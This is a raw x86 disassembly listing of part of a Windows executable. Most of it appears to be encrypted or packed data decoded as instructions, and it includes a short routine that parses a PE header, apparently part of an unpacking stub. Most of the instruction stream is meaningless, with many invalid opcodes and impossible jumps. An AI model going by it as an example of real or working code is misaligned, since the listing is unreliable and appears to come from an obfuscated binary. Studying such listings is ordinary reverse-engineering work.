  40fa45:	and    esi,DWORD PTR [ebx+0x57]
  40fa48:	addr16 and al,0x84
  40fa4b:	jle    0x94254eb3
  40fa51:	fidiv  DWORD PTR [edi]
  40fa53:	pusha  
  40fa54:	clc    
  40fa55:	or     BYTE PTR [ebp-0x2],dl
  40fa58:	mov    ebp,DWORD PTR [ebx-0x1f01bc8]
  40fa5e:	jmp    0x9fb5:0x154e5fd
  40fa65:	in     al,dx
  40fa66:	push   eax
  40fa67:	mov    ds:0xedc48a46,eax
  40fa6c:	sub    dl,ah
  40fa6e:	retf   0x840d
  40fa71:	jg     0x40fa82
  40fa73:	adc    eax,0x128635d7
  40fa78:	dec    esi
  40fa79:	loope  0x40fa10
  40fa7b:	arpl   WORD PTR [ecx-0x1a0ebd52],bx
  40fa81:	fiadd  WORD PTR [esi]
  40fa83:	adc    bl,bl
  40fa85:	pop    edi
  40fa86:	pop    ebx
  40fa87:	stos   DWORD PTR es:[edi],eax
  40fa88:	jae    0x40fad3
  40fa8a:	jmp    0xcdb1:0xc4ccf754
  40fa91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa92:	pop    esi
  40fa93:	ror    BYTE PTR [eax],cl
  40fa95:	cdq    
  40fa96:	or     DWORD PTR [edi+0x35],ecx
  40fa99:	fld    QWORD PTR [ebx+edx*4-0x2ce39779]
  40faa0:	call   0xde0f:0xcbe9074a
  40faa7:	fistp  WORD PTR [esi]
  40faa9:	xor    ebx,DWORD PTR [esi+0x2d]
  40faac:	adc    DWORD PTR [edx-0x62],ebx
  40faaf:	inc    esi
  40fab0:	dec    ecx
  40fab1:	(bad)  
  40fab2:	hlt    
  40fab3:	andps  xmm0,XMMWORD PTR [edx-0x77]
  40fab7:	fs sti 
  40fab9:	popf   
  40faba:	clc    
  40fabb:	inc    ebp
  40fabc:	mov    ds:0x40145ff5,al
  40fac1:	pop    ebp
  40fac2:	sub    BYTE PTR [ecx],dh
  40fac4:	pop    esi
  40fac5:	fimul  DWORD PTR [ebp+0x3fe99cae]
  40facb:	int    0x94
  40facd:	das    
  40face:	cmp    si,WORD PTR [eax-0x7427829d]
  40fad5:	xor    ebp,ebx
  40fad7:	pop    es
  40fad8:	jle    0x40fa74
  40fada:	nop
  40fadb:	bt     ebx,ecx
  40fade:	sub    DWORD PTR [eax],eax
  40fae0:	ja     0x40fb1a
  40fae2:	fidivr DWORD PTR [eax+0x42]
  40fae5:	imul   esp,DWORD PTR [ecx-0x27ad07b9],0xffffffc5
  40faec:	dec    ecx
  40faed:	pop    ss
  40faee:	xor    al,0xa7
  40faf0:	adc    BYTE PTR [eax+0x55],cl
  40faf3:	mov    dl,0x1a
  40faf5:	es loope 0x40fab5
  40faf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faf9:	in     al,0xc6
  40fafb:	test   eax,0x17013a09
  40fb00:	mov    esp,0x12f56a46
  40fb05:	sub    bh,0xc4
  40fb08:	jne    0x40fa98
  40fb0a:	cmp    BYTE PTR [eax-0x8],ah
  40fb0d:	call   0x5658:0xaa743b63
  40fb14:	add    edi,eax
  40fb16:	mov    cl,cl
  40fb18:	sahf   
  40fb19:	ins    BYTE PTR es:[edi],dx
  40fb1a:	mov    cl,0x9
  40fb1c:	fidivr WORD PTR [esp+ebp*2+0x22]
  40fb20:	ret    
  40fb21:	pop    es
  40fb22:	nop
  40fb23:	mov    bl,0x60
  40fb25:	add    BYTE PTR [ebp+0x70],cl
  40fb28:	aad    0xd3
  40fb2a:	mov    ebp,0x3c9b4219
  40fb2f:	mov    al,0x5a
  40fb31:	cmp    BYTE PTR [edi+ebp*8],ah
  40fb34:	lds    esi,FWORD PTR [ecx-0x42]
  40fb37:	jo     0x40faef
  40fb39:	retf   0x5055
  40fb3c:	adc    cx,WORD PTR [ebp+edx*8+0x7ab6e552]
  40fb44:	sbb    eax,DWORD PTR [edx]
  40fb46:	xor    edx,DWORD PTR ds:[ecx-0x1e]
  40fb4a:	rol    ecx,1
  40fb4c:	adc    bh,BYTE PTR [eax+0x79]
  40fb4f:	data16 stc 
  40fb51:	add    al,0x73
  40fb53:	mov    cl,0x97
  40fb55:	lock test al,0xea
  40fb58:	iret   
  40fb59:	idiv   BYTE PTR [ebp-0x29]
  40fb5c:	mov    WORD PTR ds:0xa1a018fe,ds
  40fb62:	inc    ebx
  40fb63:	bound  edi,QWORD PTR [ecx]
  40fb65:	fst    st(1)
  40fb67:	jno    0x40fb6f
  40fb69:	sbb    BYTE PTR [eax-0x2d],bh
  40fb6c:	clc    
  40fb6d:	xchg   BYTE PTR [ecx-0x2d6e8666],bh
  40fb73:	or     eax,0xafd5cf61
  40fb78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb79:	cdq    
  40fb7a:	xchg   ebx,eax
  40fb7b:	ret    
  40fb7c:	mov    eax,0xec37f3fa
  40fb81:	push   ss
  40fb82:	and    bh,dl
  40fb84:	test   al,0xbb
  40fb86:	cmp    al,0x75
  40fb88:	ss sbb eax,0x4ea8760f
  40fb8e:	stc    
  40fb8f:	xor    al,0xa2
  40fb91:	and    ah,BYTE PTR [ecx+0x6bc7fc34]
  40fb97:	mov    ecx,0xf751bb6c
  40fb9c:	sbb    eax,0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xc5
  40fbb3:	mov    ecx,0xb1823863
  40fbb8:	jo     0x40fc2a
  40fbba:	mov    ds:0xd470707d,eax
  40fbbf:	inc    edi
  40fbc0:	cmp    al,0x72
  40fbc2:	or     al,0x6c
  40fbc4:	cld    
  40fbc5:	mov    ds:0xf9274671,eax
  40fbca:	xlat   BYTE PTR ds:[ebx]
  40fbcb:	pop    ecx
  40fbcc:	mov    edx,0x6386305d
  40fbd1:	jb     0x40fb5a
  40fbd3:	fistp  QWORD PTR [ebx]
  40fbd5:	mov    esi,0x7ec8b5e6
  40fbda:	into   
  40fbdb:	add    bh,ah
  40fbdd:	adc    al,0xbd
  40fbdf:	pop    ecx
  40fbe0:	retf   0x2b3e
  40fbe3:	fistp  DWORD PTR [edi]
  40fbe5:	pop    esi
  40fbe6:	ds adc al,0xfb
  40fbe9:	jle    0x40fc2d
  40fbeb:	icebp  
  40fbec:	cmp    DWORD PTR [edi+0x511f9ef4],esp
  40fbf2:	(bad)  
  40fbf3:	mov    eax,0x44bc4050
  40fbf8:	call   0x7b1f5d59
  40fbfd:	mov    DWORD PTR [esi-0x5ed0554b],ecx
  40fc03:	jo     0x40fb91
  40fc05:	mov    esp,0xfb415b40
  40fc0a:	mov    WORD PTR [eax],es
  40fc0c:	pop    edi
  40fc0d:	std    
  40fc0e:	mov    ds:0x856effb2,al
  40fc13:	test   DWORD PTR [ebx-0x11],ecx
  40fc16:	jo     0x40fbb1
  40fc18:	adc    BYTE PTR [esi-0x2e9d1ca8],dh
  40fc1e:	mov    eax,0xf84a26b8
  40fc23:	and    BYTE PTR es:[ecx-0x38393b09],ch
  40fc2a:	(bad)  
  40fc2b:	xor    al,0xf4
  40fc2d:	sub    bh,BYTE PTR [edi+0x56]
  40fc30:	retf   0xc6bc
  40fc33:	mov    BYTE PTR [ecx+0x59],ah
  40fc36:	dec    ebp
  40fc37:	dec    eax
  40fc38:	inc    edi
  40fc39:	imul   esi,DWORD PTR [edi],0x6cfd6267
  40fc3f:	add    al,0x57
  40fc41:	(bad)  
  40fc42:	out    dx,eax
  40fc43:	call   0x9f0:0x828e2664
  40fc4a:	dec    ecx
  40fc4b:	xor    dl,bl
  40fc4d:	call   0x322e0967
  40fc52:	inc    edi
  40fc53:	push   0x3d
  40fc55:	sbb    ecx,DWORD PTR [ecx]
  40fc57:	ds jnp 0x40fc44
  40fc5a:	pop    eax
  40fc5b:	xor    ebp,edx
  40fc5d:	push   0x98132ff7
  40fc62:	push   ss
  40fc63:	sub    eax,0x6b329b14
  40fc68:	lea    ecx,[eax]
  40fc6a:	mov    al,0x69
  40fc6c:	enter  0xed9d,0xfc
  40fc70:	and    al,BYTE PTR [ebp+eiz*8+0x448083be]
  40fc77:	or     esi,edi
  40fc79:	mov    edi,0x8ce27173
  40fc7e:	ss dec ebx
  40fc80:	xchg   ebx,eax
  40fc81:	pop    ss
  40fc82:	dec    ecx
  40fc83:	ret    
  40fc84:	stos   DWORD PTR es:[edi],eax
  40fc85:	lock popf 
  40fc87:	xchg   DWORD PTR [eax],esp
  40fc89:	inc    edi
  40fc8a:	or     BYTE PTR [edi+edx*8],0xb5
  40fc8e:	js     0x40fc9e
  40fc90:	fistp  WORD PTR [edi]
  40fc92:	cmp    BYTE PTR [eax+0x46],dh
  40fc95:	test   DWORD PTR [ebx+ebp*1-0x11],esi
  40fc99:	or     DWORD PTR [ebx],ebp
  40fc9b:	and    bh,BYTE PTR ds:0x8d4c4213
  40fca1:	cmp    ah,BYTE PTR [ecx-0x6]
  40fca4:	mov    DWORD PTR [ebx],esi
  40fca6:	loopne 0x40fccb
  40fca8:	push   es
  40fca9:	imul   ebx,DWORD PTR [ecx],0x846ffe43
  40fcaf:	inc    ebp
  40fcb0:	jbe    0x40fc8e
  40fcb2:	mov    ds:0x3d436529,eax
  40fcb7:	jne    0x40fc46
  40fcb9:	xchg   esp,eax
  40fcba:	mov    al,ds:0xe22e5d9c
  40fcbf:	sub    al,0x44
  40fcc1:	lods   al,BYTE PTR ds:[esi]
  40fcc2:	imul   ecx,DWORD PTR [eax+0x41],0xffffffc8
  40fcc6:	div    DWORD PTR ds:[edx-0x11]
  40fcca:	dec    ecx
  40fccb:	call   0x628d:0x83c873bd
  40fcd2:	and    edi,DWORD PTR [edi]
  40fcd4:	call   0x5809a924
  40fcd9:	cs push ds
  40fcdb:	pop    esi
  40fcdc:	sbb    BYTE PTR ds:0x85ee4f1e,0x95
  40fce3:	ret    0xd53f
  40fce6:	jns    0x40fd12
  40fce8:	pop    ss
  40fce9:	adc    ah,dh
  40fceb:	data16 jle 0x40fd55
  40fcee:	xchg   edi,eax
  40fcef:	les    edi,FWORD PTR [edi]
  40fcf1:	ret    0x9b45
  40fcf4:	fcomp  QWORD PTR [ebx]
  40fcf6:	or     DWORD PTR [ebx+0x7],ebp
  40fcf9:	add    DWORD PTR [ebx],0xffffffc2
  40fcfc:	jecxz  0x40fd3b
  40fcfe:	fstp   DWORD PTR [ebx+0x687635f6]
  40fd04:	adc    eax,0x2f8a08cc
  40fd09:	mov    dh,0x6c
  40fd0b:	mov    dh,0xde
  40fd0d:	inc    ebx
  40fd0e:	int3   
  40fd0f:	dec    esp
  40fd10:	mov    bh,0xe5
  40fd12:	iret   
  40fd13:	shl    BYTE PTR [edx+0xc],0x36
  40fd17:	push   ds
  40fd18:	add    eax,0xb7168ff7
  40fd1d:	lea    ebx,[ebx]
  40fd1f:	jp     0x40fcff
  40fd21:	jno    0x40fd05
  40fd23:	(bad)  
  40fd24:	or     al,0x53
  40fd26:	(bad)  
  40fd27:	out    0x4,eax
  40fd29:	aas    
  40fd2a:	push   0xffffffcf
  40fd2c:	loop   0x40fd1d
  40fd2e:	outs   dx,BYTE PTR ds:[esi]
  40fd2f:	jbe    0x40fd14
  40fd31:	pop    ds
  40fd32:	adc    DWORD PTR [ebp-0x7e],0xde5854a7
  40fd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd3a:	ja     0x40fcd4
  40fd3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd3d:	pop    edi
  40fd3e:	pop    ecx
  40fd3f:	pop    esp
  40fd40:	mov    dl,0x53
  40fd42:	inc    edx
  40fd43:	cmp    DWORD PTR [ebx+0x6d6d495a],edi
  40fd49:	imul   BYTE PTR [eax+0x38d6d520]
  40fd4f:	xchg   ecx,eax
  40fd50:	stc    
  40fd51:	xchg   edi,eax
  40fd52:	fcompp 
  40fd54:	push   ebx
  40fd55:	jg     0x40fcda
  40fd57:	adc    ah,bh
  40fd59:	jnp    0x40fcdf
  40fd5b:	mov    dh,BYTE PTR [edi+eax*4-0x80]
  40fd5f:	dec    ecx
  40fd60:	in     eax,0x66
  40fd62:	inc    ebx
  40fd63:	dec    esp
  40fd64:	ins    DWORD PTR es:[edi],dx
  40fd65:	mov    bl,BYTE PTR [ebx-0x74aeef52]
  40fd6b:	std    
  40fd6c:	in     eax,0x1b
  40fd6e:	gs cs in eax,dx
  40fd71:	mov    al,0xd8
  40fd73:	pop    esi
  40fd74:	or     BYTE PTR [edi],0x90
  40fd77:	int    0x88
  40fd79:	(bad)  
  40fd7a:	jp     0x40fdac
  40fd7c:	xchg   dx,ax
  40fd7e:	fndisi(8087 only) 
  40fd80:	(bad)  
  40fd82:	rol    DWORD PTR [ebx+0x42d31e8d],1
  40fd88:	add    al,0x68
  40fd8a:	and    DWORD PTR [ebx],ebx
  40fd8c:	or     ebx,DWORD PTR [edi]
  40fd8e:	gs jmp 0xc775e6ce
  40fd94:	retf   0xdefc
  40fd97:	loopne 0x40fde4
  40fd99:	xchg   edx,eax
  40fd9a:	pop    edx
  40fd9b:	test   eax,0x80b2d796
  40fda0:	sub    edi,DWORD PTR [edi+0x35dcd292]
  40fda6:	pop    edi
  40fda7:	add    al,0x3d
  40fda9:	jno    0x40fd8b
  40fdab:	out    dx,al
  40fdac:	or     eax,0x1dc2e3e0
  40fdb1:	and    cl,ah
  40fdb3:	push   0xcee6a7c0
  40fdb8:	xchg   edi,eax
  40fdb9:	aad    0x4e
  40fdbb:	xchg   edi,eax
  40fdbc:	sbb    eax,0xbdea5fbd
  40fdc1:	bound  edi,QWORD PTR [ecx+ebp*8]
  40fdc4:	mov    ebx,0xc09b39b
  40fdc9:	sbb    BYTE PTR [ebp+0x23449448],bh
  40fdcf:	dec    esp
  40fdd0:	add    al,0xd3
  40fdd2:	enter  0x7512,0xd7
  40fdd6:	shr    DWORD PTR [edx],0x2b
  40fdd9:	mov    bl,0x76
  40fddb:	stc    
  40fddc:	loope  0x40fd7c
  40fdde:	(bad)  
  40fddf:	outs   dx,DWORD PTR ds:[esi]
  40fde0:	sar    cl,1
  40fde2:	(bad)  
  40fde3:	out    dx,eax
  40fde4:	jnp    0x40fda5
  40fde6:	test   eax,0x4ff5de93
  40fdeb:	(bad)  
  40fdec:	cld    
  40fded:	js     0x40fe2c
  40fdef:	jp     0x40fdbe
  40fdf1:	mov    eax,ds:0x9ad32aeb
  40fdf6:	and    DWORD PTR [ebp-0x2f26be2e],esi
  40fdfc:	je     0x40fe70
  40fdfe:	or     eax,0xf726a77
  40fe03:	jg     0x40fe51
  40fe05:	push   edi
  40fe06:	cwde   
  40fe07:	mov    esp,eax
  40fe09:	jmp    0xe325:0x6121afba
  40fe10:	test   DWORD PTR ds:0xaff0ffed,0xac349aa6
  40fe1a:	xlat   BYTE PTR ds:[ebx]
  40fe1b:	inc    esp
  40fe1c:	sub    al,0x79
  40fe1e:	(bad)  
  40fe1f:	push   edi
  40fe20:	into   
  40fe21:	icebp  
  40fe22:	fmul   st(3),st
  40fe24:	stos   DWORD PTR es:[edi],eax
  40fe25:	pop    ds
  40fe26:	outs   dx,DWORD PTR ds:[esi]
  40fe27:	xchg   edi,eax
  40fe28:	add    ch,BYTE PTR [ebp-0x7d]
  40fe2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe2c:	call   DWORD PTR [edx]
  40fe2e:	dec    ebp
  40fe2f:	mov    gs,eax
  40fe31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe32:	and    ch,BYTE PTR [eax-0x73832cdc]
  40fe38:	ss pusha 
  40fe3a:	outs   dx,DWORD PTR ds:[esi]
  40fe3b:	inc    esi
  40fe3c:	outs   dx,BYTE PTR ds:[esi]
  40fe3d:	push   edx
  40fe3e:	sbb    BYTE PTR [ebx+ebp*4+0x7a],0x54
  40fe43:	adc    al,cl
  40fe45:	aam    0x35
  40fe47:	or     DWORD PTR [ebx],edi
  40fe49:	fnstsw WORD PTR [ecx-0x54]
  40fe4c:	mov    ebp,0x709aa9fb
  40fe51:	mov    al,ds:0x9eb9fb4b
  40fe56:	pop    esi
  40fe57:	stos   DWORD PTR es:[edi],eax
  40fe58:	call   0xc7f9f22d
  40fe5d:	mov    edi,DWORD PTR [ebx-0xf06114a]
  40fe63:	sbb    eax,0x5b1fd829
  40fe68:	inc    eax
  40fe69:	mov    eax,ds:0xef26fa6f
  40fe6e:	clc    
  40fe6f:	arpl   WORD PTR [ecx+0x53e18d4b],sp
  40fe75:	lods   al,BYTE PTR ds:[esi]
  40fe76:	sbb    eax,0xd52f3050
  40fe7b:	mov    esi,0xfac2a182
  40fe80:	and    DWORD PTR [ebx+0x2c],0xdad5b79
  40fe87:	fcomi  st,st(0)
  40fe89:	cmp    dh,ch
  40fe8b:	push   eax
  40fe8c:	or     bh,BYTE PTR [ecx+0x9]
  40fe8f:	ss cs stc 
  40fe92:	cld    
  40fe93:	js     0x40fe1a
  40fe95:	or     eax,DWORD PTR [ebp+0x69]
  40fe98:	cld    
  40fe99:	sar    dl,0x99
  40fe9c:	xor    bh,BYTE PTR ds:0xcb31aaaa
  40fea2:	loope  0x40feef
  40fea4:	cli    
  40fea5:	or     al,0x3e
  40fea7:	fsub   DWORD PTR [ebx+ebx*4+0x57]
  40feab:	or     al,0x16
  40fead:	retf   
  40feae:	pushf  
  40feaf:	cvtsd2si esi,xmm1
  40feb3:	cld    
  40feb4:	ja     0x40ff18
  40feb6:	mov    eax,ds:0xa965a47
  40febb:	imul   ebx,esp,0x79
  40febe:	enter  0xb642,0x83
  40fec2:	or     DWORD PTR [edi],esp
  40fec4:	jle    0x40fe77
  40fec6:	dec    edi
  40fec7:	adc    al,0x92
  40fec9:	test   DWORD PTR [ebp-0x21cfded7],ebp
  40fecf:	out    0x61,eax
  40fed1:	jno    0x40fedd
  40fed3:	sbb    BYTE PTR [ecx+0xc45ab1c],ah
  40fed9:	lock pop eax
  40fedb:	mov    ds:0xab957b0e,al
  40fee0:	out    dx,al
  40fee1:	xchg   esp,eax
  40fee2:	xor    al,bl
  40fee4:	sbb    al,BYTE PTR [edx+0x709b9845]
  40feea:	test   al,0xcb
  40feec:	push   eax
  40feed:	or     eax,0x76054c96
  40fef2:	inc    eax
  40fef3:	dec    esp
  40fef4:	adc    BYTE PTR [eax],bh
  40fef6:	(bad)  
  40fef7:	fdiv   st,st(5)
  40fef9:	clc    
  40fefa:	je     0x40ff3b
  40fefc:	ins    DWORD PTR es:[edi],dx
  40fefd:	xlat   BYTE PTR ds:[ebx]
  40fefe:	es ja  0x40fec5
  40ff01:	into   
  40ff02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff03:	inc    eax
  40ff04:	rol    DWORD PTR ds:0x53d7b327,cl
  40ff0a:	arpl   WORD PTR [edx],dx
  40ff0c:	and    ebx,DWORD PTR [esi]
  40ff0e:	ret    0xc5e5
  40ff11:	lock in al,dx
  40ff13:	or     DWORD PTR [esi+0x5be99cab],ecx
  40ff19:	or     al,0xca
  40ff1b:	xor    ecx,DWORD PTR [edi-0x67213a2e]
  40ff21:	jb     0x40ff58
  40ff23:	sbb    eax,DWORD PTR [edx-0x7a]
  40ff26:	pop    ebx
  40ff27:	xor    ebx,DWORD PTR [edx+0x220a71ab]
  40ff2d:	pop    ecx
  40ff2e:	rcl    BYTE PTR es:[eax-0x79a61119],0x8a
  40ff36:	mov    dh,ch
  40ff38:	cli    
  40ff39:	mov    DWORD PTR [ecx-0x3fffb86f],esi
  40ff3f:	(bad)  
  40ff40:	xchg   edi,eax
  40ff41:	xor    BYTE PTR [ecx+0x71957568],bl
  40ff47:	sub    al,0x96
  40ff49:	mov    eax,ds:0xf11f1d7b
  40ff4e:	dec    edi
  40ff4f:	ret    
  40ff50:	add    eax,DWORD PTR [edx]
  40ff52:	stos   DWORD PTR es:[edi],eax
  40ff53:	pop    ecx
  40ff54:	(bad)  
  40ff56:	mov    esp,0x4ad34564
  40ff5b:	pusha  
  40ff5c:	clc    
  40ff5d:	jae    0x40ffd4
  40ff5f:	daa    
  40ff60:	outs   dx,BYTE PTR ds:[esi]
  40ff61:	cli    
  40ff62:	ds loope 0x40ff35
  40ff65:	test   BYTE PTR [esi+0x32],0x99
  40ff69:	sub    BYTE PTR [esi],dl
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	(bad)  
  40ffde:	cmp    al,BYTE PTR ds:0x7070bd35
  40ffe4:	mov    ds:0x4f70707d,eax
  40ffe9:	mov    esi,0x48f185f7
  40ffee:	push   es
  40ffef:	repz sub bl,ch
  40fff2:	sbb    edx,DWORD PTR [edi-0x61af08b7]
  40fff8:	cwde   
  40fff9:	cmp    BYTE PTR [ecx-0x6bfc9021],bh
  40ffff:	pop    ds
  410000:	pusha  
  410001:	stos   DWORD PTR es:[edi],eax
  410002:	mov    BYTE PTR [ebp+0x40498cad],cl
  410008:	pop    ss
  410009:	pop    esp
  41000a:	mov    edi,0xb4fba50b
  41000f:	push   cs
  410010:	jmp    0x40ffa2
  410012:	ins    BYTE PTR es:[edi],dx
  410013:	push   edi
  410014:	and    ah,dh
  410016:	jb     0x40ff9a
  410018:	mov    dh,0x90
  41001a:	sub    DWORD PTR [edi-0x131df919],0x3ce526f2
  410024:	inc    edi
  410025:	test   DWORD PTR [ebx],ebx
  410027:	in     eax,0xd1
  410029:	cmp    ah,BYTE PTR [ebp+0x38]
  41002c:	sbb    BYTE PTR [eax+0x2b],bl
  41002f:	ss aad 0x20
  410032:	xlat   BYTE PTR ds:[ebx]
  410033:	add    ch,BYTE PTR [edi+0x2c77e37]
  410039:	xor    cl,ah
  41003b:	push   edx
  41003c:	inc    esp
  41003d:	dec    eax
  41003e:	sub    BYTE PTR [edi+0x27],dh
  410041:	lds    ecx,FWORD PTR [ebx-0x74]
  410044:	rcl    esi,cl
  410046:	adc    ah,cl
  410048:	lods   al,BYTE PTR ds:[esi]
  410049:	ja     0x4100af
  41004b:	mov    esp,0xfd89e343
  410050:	and    eax,DWORD PTR [edx-0x1405e2c1]
  410056:	pop    ds
  410057:	jg     0x410040
  410059:	mov    eax,0xb82359fc
  41005e:	mov    ds:0xec5250ac,eax
  410063:	pop    ebp
  410064:	dec    ecx
  410065:	in     eax,0x14
  410067:	pop    esp
  410068:	pop    ebx
  410069:	cli    
  41006a:	sti    
  41006b:	or     eax,0x4214bdf1
  410070:	add    al,0x52
  410072:	sub    eax,0x62a1457d
  410077:	out    dx,eax
  410078:	jnp    0x41000a
  41007a:	mov    WORD PTR [ebp+esi*2+0x4f],gs
  41007e:	sub    eax,0x6d1af1d4
  410083:	xor    ch,BYTE PTR [ebx-0x18]
  410086:	pop    esi
  410087:	rcr    DWORD PTR [edi-0x75],cl
  41008a:	and    eax,0x53a25672
  41008f:	in     eax,0x99
  410091:	xchg   esp,eax
  410092:	adc    cl,BYTE PTR [ebx-0x25]
  410095:	je     0x41008b
  410097:	and    DWORD PTR [edx+eax*2],esi
  41009a:	cli    
  41009b:	ds sub al,0x2
  41009e:	jnp    0x410048
  4100a0:	out    dx,eax
  4100a1:	(bad)  [eax-0x7d]
  4100a4:	or     DWORD PTR [edx],0xb643e8b9
  4100aa:	fisttp DWORD PTR [esi+0x31950e1]
  4100b0:	xor    DWORD PTR [eax+esi*4-0x35f07a3d],0xffffffaf
  4100b8:	es out dx,eax
  4100ba:	adc    ch,BYTE PTR [esi]
  4100bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100bd:	mov    cl,dl
  4100bf:	and    cl,dh
  4100c1:	pop    ecx
  4100c2:	and    al,0xe7
  4100c4:	ja     0x4100ee
  4100c6:	js     0x4100c7
  4100c8:	inc    edi
  4100c9:	pop    eax
  4100ca:	(bad)  
  4100cb:	cmp    dl,BYTE PTR [eax]
  4100cd:	jle    0x410121
  4100cf:	cld    
  4100d0:	xor    BYTE PTR [ebx+0x100fbef],al
  4100d6:	cdq    
  4100d7:	mov    bl,0x93
  4100d9:	loop   0x410084
  4100db:	push   ss
  4100dc:	mov    eax,ds:0xaf1ea118
  4100e1:	sbb    edx,DWORD PTR [edx-0xb]
  4100e4:	pop    ebx
  4100e5:	shr    esp,1
  4100e7:	sub    BYTE PTR [ecx-0x53],ah
  4100ea:	cmp    bl,BYTE PTR [ebp+0x20]
  4100ed:	mov    bl,0x82
  4100ef:	jmp    0x410094
  4100f1:	stos   BYTE PTR es:[edi],al
  4100f2:	pop    ebp
  4100f3:	xchg   BYTE PTR [edi],cl
  4100f5:	pop    ebx
  4100f6:	outs   dx,DWORD PTR ds:[esi]
  4100f7:	jae    0x410094
  4100f9:	rcr    DWORD PTR [edx-0x13249422],cl
  4100ff:	repz jmp 0x410170
  410102:	add    bh,BYTE PTR [ebp+0x44]
  410105:	mov    cl,0xe9
  410107:	aad    0xb3
  410109:	sbb    al,0x3c
  41010b:	les    ebx,FWORD PTR [esi+0x72]
  41010e:	call   0x2de47ba
  410113:	in     eax,dx
  410114:	adc    eax,0x8b6abaca
  410119:	sbb    ebp,0x9f23e109
  41011f:	imul   esp,DWORD PTR [edx],0xffffffa8
  410122:	in     eax,0x16
  410124:	push   esp
  410125:	cdq    
  410126:	stc    
  410127:	(bad)  
  410128:	popw   ds
  41012a:	xor    edi,eax
  41012c:	xlat   BYTE PTR ds:[ebx]
  41012d:	in     al,dx
  41012e:	lods   eax,DWORD PTR ds:[esi]
  41012f:	idiv   DWORD PTR [edx-0x35e487fe]
  410135:	sbb    ecx,DWORD PTR [ebp+0x3161cba0]
  41013b:	cmp    DWORD PTR [ebx-0x13],ebp
  41013e:	push   ss
  41013f:	and    ecx,ecx
  410141:	inc    eax
  410142:	cmp    BYTE PTR es:[ecx],bl
  410145:	cdq    
  410146:	cdq    
  410147:	xchg   esp,eax
  410148:	(bad)  
  410149:	icebp  
  41014a:	hlt    
  41014b:	mov    edi,0xd56687a
  410150:	jae    0x4100f0
  410152:	jecxz  0x4100ec
  410154:	add    ebx,edi
  410156:	or     bl,0x61
  410159:	sbb    DWORD PTR [edi+0x7e36d6cf],edi
  41015f:	mov    ebp,esp
  410161:	mov    dl,0x65
  410163:	(bad)  
  410165:	dec    eax
  410166:	pop    es
  410167:	fimul  DWORD PTR [esi+0x42]
  41016a:	or     DWORD PTR ds:0xe902aecc,eax
  410170:	test   ebp,0x278bbb72
  410176:	imul   ebx,ebx,0xffffff82
  410179:	jl     0x410151
  41017b:	sub    al,0x98
  41017d:	mov    edx,0x303752f0
  410182:	dec    eax
  410183:	adc    al,0xe6
  410185:	cmp    esp,ebp
  410187:	iret   
  410188:	mov    esi,edi
  41018a:	ds loope 0x410115
  41018d:	scas   eax,DWORD PTR es:[edi]
  41018e:	sub    eax,0x3dd242f0
  410193:	outs   dx,BYTE PTR ds:[esi]
  410194:	and    cl,0x90
  410197:	cmp    ecx,DWORD PTR ds:0x4116fa01
  41019d:	pop    edi
  41019e:	push   eax
  41019f:	and    DWORD PTR [eax],ebp
  4101a1:	add    bl,ch
  4101a3:	sub    dh,0xd2
  4101a6:	stos   BYTE PTR es:[edi],al
  4101a7:	mov    ah,0xde
  4101a9:	sub    eax,0x62d39749
  4101ae:	iret   
  4101af:	sbb    cl,BYTE PTR [esi+0x9]
  4101b2:	(bad)  
  4101b3:	sub    esi,DWORD PTR ds:0x3b497cdb
  4101b9:	dec    edi
  4101ba:	jnp    0x4101d0
  4101bc:	fadd   QWORD PTR [edi]
  4101be:	neg    BYTE PTR [eax]
  4101c0:	inc    esp
  4101c1:	lock in al,dx
  4101c3:	mov    esp,fs
  4101c5:	jmp    0xf86ce26e
  4101ca:	std    
  4101cb:	xor    bh,dh
  4101cd:	add    eax,0x5430fb87
  4101d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101d3:	mov    bh,0xa4
  4101d5:	je     0x4101dc
  4101d7:	out    dx,eax
  4101d8:	leave  
  4101d9:	xor    dl,dl
  4101db:	pop    edi
  4101dc:	mov    ah,al
  4101de:	aam    0xc0
  4101e0:	jp     0x410233
  4101e2:	cmp    BYTE PTR [esi+ecx*8],al
  4101e5:	mov    cl,0x98
  4101e7:	sahf   
  4101e8:	mov    gs,ebx
  4101ea:	and    eax,0x58c45b2b
  4101ef:	mov    al,0xa4
  4101f1:	mov    dh,0x1e
  4101f3:	ret    0x6be5
  4101f6:	push   ebx
  4101f7:	call   0x5d75af3d
  4101fc:	jb     0x41026d
  4101fe:	sbb    edx,DWORD PTR [edx-0x6f02c448]
  410204:	and    al,0xf1
  410206:	repz (bad) 
